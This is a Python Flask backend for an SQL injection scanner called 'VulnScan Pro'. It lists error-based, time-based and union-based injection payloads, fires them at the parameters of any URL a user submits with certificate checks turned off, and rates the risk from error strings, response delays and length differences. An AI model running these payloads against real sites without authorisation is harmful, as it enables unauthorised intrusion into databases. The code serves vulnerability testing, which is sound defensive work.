from flask import Flask, request, jsonify, send_from_directory
import requests as req
import time
import json
import re
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

app = Flask(__name__, static_folder='static')

# --- Expanded payload sets by technique ---
PAYLOADS = {
    "error_based": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "\" OR \"1\"=\"1",
        "' OR ''='",
        "' OR 1=1#",
        "' AND 1=CONVERT(int, 'a') --",   # MSSQL
        "' AND extractvalue(1,concat(0x7e,version())) --",  # MySQL
        "' AND 1=1 UNION SELECT null --",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5' --",     # MSSQL
        "' OR SLEEP(5) --",                # MySQL
        "'; SELECT pg_sleep(5) --",        # PostgreSQL
        "' OR 1=1 AND SLEEP(5) --",
        "1; WAITFOR DELAY '0:0:5' --",
    ],
    "union_based": [
        "' UNION SELECT null --",
        "' UNION SELECT null,null --",
        "' UNION SELECT null,null,null --",
        "' UNION ALL SELECT 'vuln','vuln' --",
    ]
}

ERROR_KEYWORDS = [
    "sql syntax", "mysql_fetch", "ora-", "odbc driver",
    "sqlite_", "pg_query", "syntax error", "unclosed quotation",
    "microsoft ole db", "jdbc", "sqlexception", "mysql_num_rows",
    "supplied argument is not a valid mysql", "division by zero",
    "invalid query", "sql command not properly ended"
]

TIME_THRESHOLD = 4.0  # seconds — flag if response takes longer than this

def extract_injectable_params(url):
    """Auto-extract all GET parameters from URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys()), parsed

def inject_param(parsed_url, params_dict, param_name, payload):
    """Inject payload into a specific parameter."""
    new_params = dict(params_dict)
    new_params[param_name] = payload
    new_query = urlencode(new_params)
    new_parsed = parsed_url._replace(query=new_query)
    return urlunparse(new_parsed)

def calculate_risk_score(results):
    """Generate a 0-100 risk score based on findings."""
    score = 0
    for r in results:
        if r.get('vulnerable'):
            technique = r.get('technique', '')
            if technique == 'time_based':
                score += 35   # High confidence — hard to false positive
            elif r.get('error_keyword'):
                score += 30   # DB error leaked — critical
            elif technique == 'union_based':
                score += 25
            else:
                score += 15   # Length diff only — lower confidence
    return min(score, 100)

def risk_label(score):
    if score >= 70: return "CRITICAL"
    if score >= 40: return "HIGH"
    if score >= 20: return "MEDIUM"
    if score > 0:   return "LOW"
    return "SAFE"

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    url = data.get('url', '').strip()
    method = data.get('method', 'GET').upper()
    timeout = int(data.get('timeout', 8))

    if not url:
        return jsonify({'error': 'No URL provided'}), 400

    # --- Auto-extract parameters ---
    parsed_url = urlparse(url)
    params_dict = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}

    # FIX: if there are no real GET parameters, there's nothing injectable.
    # Previously this fell back to a fake 'input' param and, for GET requests,
    # concatenated the raw payload onto the end of the URL (url + payload),
    # which produces a malformed URL / different error page and falsely
    # triggers "vulnerable" via byte-length diff or incidental keyword match.
    if not params_dict and method == 'GET':
        return jsonify({
            'error': 'No GET parameters found in this URL (e.g. ?id=1). '
                     'Nothing to test — add a query parameter or use POST mode.',
            'meta': {'url': url}
        }), 400

    param_names = list(params_dict.keys()) or ['input']

    results = []
    scan_meta = {
        "url": url,
        "method": method,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "params_found": param_names
    }

    # --- Baseline request ---
    try:
        start = time.time()
        if method == 'GET':
            baseline = req.get(url, timeout=timeout, verify=False)
        else:
            baseline = req.post(url, data={'input': 'test'}, timeout=timeout, verify=False)
        baseline_time = time.time() - start
        normal_length = len(baseline.text)
    except Exception as e:
        return jsonify({'error': f'Baseline request failed: {str(e)}'}), 500

    # --- Run all payload categories ---
    for technique, payload_list in PAYLOADS.items():
        for payload in payload_list:
            for param in param_names:
                try:
                    start = time.time()

                    if method == 'GET':
                        # params_dict is guaranteed non-empty here for GET
                        # (we returned early above otherwise), so this always
                        # does a proper parameter injection — no more raw
                        # url + payload concatenation.
                        test_url = inject_param(parsed_url, params_dict, param, payload)
                        response = req.get(test_url, timeout=timeout, verify=False)
                    else:
                        post_data = dict(params_dict) if params_dict else {}
                        post_data[param] = payload
                        response = req.post(url, data=post_data, timeout=timeout, verify=False)

                    elapsed = time.time() - start
                    diff = abs(normal_length - len(response.text))
                    error_found = any(k in response.text.lower() for k in ERROR_KEYWORDS)

                    # Time-based: flag if response took suspiciously long
                    time_anomaly = (technique == 'time_based' and
                                    elapsed >= TIME_THRESHOLD and
                                    elapsed >= baseline_time + 3.0)

                    vulnerable = time_anomaly or error_found or (diff > 50 and technique != 'time_based')

                    results.append({
                        'payload': payload,
                        'technique': technique,
                        'parameter': param,
                        'diff': diff,
                        'response_time': round(elapsed, 2),
                        'baseline_time': round(baseline_time, 2),
                        'vulnerable': vulnerable,
                        'error_keyword': error_found,
                        'time_anomaly': time_anomaly,
                    })

                except Exception as e:
                    results.append({
                        'payload': payload,
                        'technique': technique,
                        'parameter': param,
                        'diff': 0,
                        'vulnerable': False,
                        'error': str(e)
                    })

    # --- Risk scoring ---
    score = calculate_risk_score(results)
    label = risk_label(score)

    return jsonify({
        'meta': scan_meta,
        'baseline_length': normal_length,
        'baseline_time': round(baseline_time, 2),
        'results': results,
        'risk_score': score,
        'risk_label': label,
        'vulnerable_count': sum(1 for r in results if r.get('vulnerable')),
        'total_tests': len(results)
    })

@app.route('/export', methods=['POST'])
def export_report():
    """Return a structured JSON report for download."""
    data = request.json
    report = {
        "report_generated": datetime.utcnow().isoformat() + "Z",
        "tool": "VulnScan Pro",
        "scan": data
    }
    return jsonify(report)

if __name__ == '__main__':
    print("\n  VulnScan Pro — Flask Backend")
    print("  http://localhost:5122\n")
    app.run(debug=True, port=5122)